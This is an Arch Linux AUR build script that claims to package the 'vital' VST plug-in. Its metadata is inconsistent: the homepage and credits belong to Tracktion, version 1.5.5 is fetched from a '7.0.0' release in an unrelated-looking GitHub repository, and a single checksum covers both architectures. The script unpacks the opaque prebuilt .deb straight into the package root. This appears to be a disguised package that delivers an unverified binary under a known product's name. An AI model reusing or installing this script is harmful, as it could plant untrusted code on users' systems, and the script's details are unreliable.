# Maintainer: Mathias Buhr <napcode@aparatus.de>
# Based on waveforum-bundle aur package from Paul B Davis <paul@dangersalad.com>
# Based on tracktion-7 aur package from Felipe F. Tonello <eu@felipetonello.com>
# Based on tracktion-6 aur package from boltbuckle <amygdala@cheerful.com>

pkgname=vital
pkgver=1.5.5
pkgrel=1
pkgdesc="VST Plug-in"
arch=('x86_64' 'aarch64')
url="https://www.tracktion.com/"
license=('custom')
depends=(
  'alsa-lib'
  'brotli'
  'bzip2'
  'freetype2'
  'gcc-libs'
  'glib2'
  'glibc'
  'graphite'
  'harfbuzz'
  'icu'
  'libcap'
  'libffi'
  'libgcrypt'
  'libglvnd'
  'libgpg-error'
  'libpng'
  'libusb'
  'libx11'
  'libxau'
  'libxcb'
  'libxdmcp'
  'lz4'
  'pcre2'
  'systemd-libs'
  'util-linux-libs'
  'webkit2gtk'
  'xz'
  'zlib'
  'zstd'
)
source_aarch64=(https://github.com/kimiusolover/toriaezutukuru/releases/download/7.0.0/VitalInstaller.deb)
source_x86_64=(https://github.com/kimiusolover/toriaezutukuru/releases/download/7.0.0/VitalInstaller.deb)
sha256sums_x86_64=('4488b4c7012198fc5a2b271f397622a2dc56ed938e7d497d55d0763adf434d91')
sha256sums_aarch64=('4488b4c7012198fc5a2b271f397622a2dc56ed938e7d497d55d0763adf434d91')

package() {
   ar vx VitalInstaller.deb
    tar -x --gz -f data.tar.gz -C "${pkgdir}"
     tar -x --gz -f control.tar.gz -C "${pkgdir}"
}
